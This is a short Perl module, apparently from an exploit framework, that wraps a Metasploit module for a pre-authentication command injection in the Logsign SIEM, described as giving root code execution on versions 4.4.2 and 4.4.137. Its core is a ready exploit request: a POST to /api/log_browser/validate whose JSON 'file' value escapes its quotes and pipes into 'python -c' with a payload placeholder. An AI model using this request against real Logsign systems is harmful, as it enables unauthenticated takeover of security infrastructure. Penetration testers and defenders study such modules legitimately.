package MSFExploits::Exploits::LOGSIGN::MSF::LogsignExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::LOGSIGN);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "LogsignExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a command injection vulnerability in Logsign.

        By exploiting this vulnerability, unauthenticated users can execute

        arbitrary code under the root user.



        Logsign has a publicly accessible endpoint. That endpoint takes a user

        input and then use it during operating system command execution without

        proper validation.



        This module was tested against 4.4.2 and 4.4.137 versions.

      ",
  MSF_MODULE  => "logsign_exec",
  REFERENCES  => [
                   "https://pentest.blog/unexpected-journey-3-visiting-another-siem-and-uncovering-pre-auth-privileged-remote-code-execution/",
                 ],
  TITLE       => "Logsign Remote Command Injection",


  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'api/log_browser/validate',
      PAYLOAD      => '{"file":"logsign.raw\" quit 2>&1 |python -c \"__PAYLOAD__\" #"}',
      TEXT   => 'Sending Exploit #1 Request : [POST] /api/log_browser/validate',
      HEADERS      => {
        'Content-Type' => 'application/json',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
